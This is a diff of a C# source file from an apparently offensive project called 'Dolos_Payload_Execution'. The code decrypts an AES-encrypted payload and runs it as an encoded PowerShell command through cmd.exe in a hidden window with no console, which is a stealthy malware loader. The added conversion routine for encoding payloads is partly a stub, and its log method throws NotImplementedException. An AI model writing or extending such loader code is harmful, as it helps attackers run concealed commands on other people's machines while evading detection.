@@ -6,70 +6,23 @@ using System.Linq;
 using System.Reflection;
 using System.Security.Cryptography;
 using System.Text;
+using System.Text.RegularExpressions;
+
 namespace Dolos_Payload_Execution
 {
     class Program
     {
-        public static String Payload = PayloadStringStorage.EncyptedPayload;
-        public static String Salt = PayloadEncryptionKeyStorage.EncryptionKey;
+        public static String Payload = Dolos_Payload_Execution.Payload.EncyptedPayload;
         static void Main(string[] args)
-        {
-            Execute();
-        }
-        static String[] commands = new String[]{
-            "cmd.exe",
-            "/C powershell.exe -EncodedCommand "
-            };
-        public static void Execute()
         {
             System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
             psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            psi.FileName = commands[0];
-            psi.Arguments = commands[1] + Crypto.Decrypt(Payload); 
-            psi.RedirectStandardOutput = true;
-            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+            psi.FileName = Commands.commands[0];
+            psi.Arguments = Commands.commands[1] + " " + Decrypt(Payload);
             System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi); ;
-            System.IO.StreamReader myOutput = proc.StandardOutput;
-            proc.WaitForExit(2000);
-            if (proc.HasExited)
-            {
-                string output = myOutput.ReadToEnd();
-                Console.WriteLine(output);
-            }
-            else
-            {
-                string output = myOutput.ReadToEnd();
-                Console.WriteLine(output);
-            }
-            Console.ReadLine();
         }
 
-        public class Crypto
-        {
-            private static String EncryptionKey = PayloadEncryptionKeyStorage.EncryptionKey;
-            public static Random rand = new Random();
-            public static string Encrypt(string clearText)
-            {
-                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
-                using (Aes encryptor = Aes.Create())
-                {
-                    byte[] IV = new byte[15];
-                    rand.NextBytes(IV);
-                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
-                    encryptor.Key = pdb.GetBytes(32);
-                    encryptor.IV = pdb.GetBytes(16);
-                    using (MemoryStream ms = new MemoryStream())
-                    {
-                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
-                        {
-                            cs.Write(clearBytes, 0, clearBytes.Length);
-                            cs.Close();
-                        }
-                        clearText = Convert.ToBase64String(IV) + Convert.ToBase64String(ms.ToArray());
-                    }
-                }
-                return clearText;
-            }
             public static string Decrypt(string cipherText)
             {
                 byte[] IV = Convert.FromBase64String(cipherText.Substring(0, 20));
@@ -77,10 +30,9 @@ namespace Dolos_Payload_Execution
                 byte[] cipherBytes = Convert.FromBase64String(cipherText);
                 using (Aes encryptor = Aes.Create())
                 {
-                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
+                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey.EncryptedKey, IV);
                     encryptor.Key = pdb.GetBytes(32);
                     encryptor.IV = pdb.GetBytes(16);
-                    encryptor.Padding = PaddingMode.None;
                     using (MemoryStream ms = new MemoryStream())
                     {
                         using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
@@ -93,6 +45,75 @@ namespace Dolos_Payload_Execution
                 }
                 return cipherText;
             }
+        public void convertasdasd(String Payload)
+        {
+            String cleanPayload = "";
+            bool Dirty;
+            byte[] plaintext;
+            String base64 = "";
+            String encrypted = "";
+            bool fatal = false;
+            log("[i] Begining conversion of payload");
+
+                log("[i] Removing formating");
+                try
+                {
+                    cleanPayload = Regex.Replace(Payload, @"\s+", "");
+                    Dirty = false;
+                }
+                catch
+                {
+                    Dirty = true;
+                    log("[!] Error in removing whitespace!");
+                }
+       
+
+            if (!Dirty)
+            {
+                log("[i] Formatting Removed Successfully");
+                plaintext = System.Text.Encoding.Unicode.GetBytes(cleanPayload);
+            }
+            else
+            {
+                log("[i] Formatting Not Removed Successfully");
+                plaintext = System.Text.Encoding.Unicode.GetBytes(Payload);
+            }
+            log("[i] Converting to B64");
+            try
+            {
+                base64 = System.Convert.ToBase64String(plaintext);
+            }
+            catch (Exception e)
+            {
+                log("[!] FATAL: Failed to convert to Base64 Trace Fallows\n" + e);
+                fatal = true;
+            }
+            log("[i] Converted to B64");
+            log("[i] Encrypting");
+            if (!fatal)
+            {
+                log($"[!] Random String Generated");
+                log($"[!] Building Encryption Key");
+                log($"[!] Encrypting");
+                try
+                {
+                    log("[i] Encrypted!");
+                }
+                catch
+                {
+                    encrypted = "ERROR";
+                    log("[!] Error In Encryption");
+                }
+            }
+            else
+            {
+                log("[!] Fatal Error Occured! Stopping!");
+            }
+        }
+
+        private void log(string v)
+        {
+            throw new NotImplementedException();
         }
     }
 }
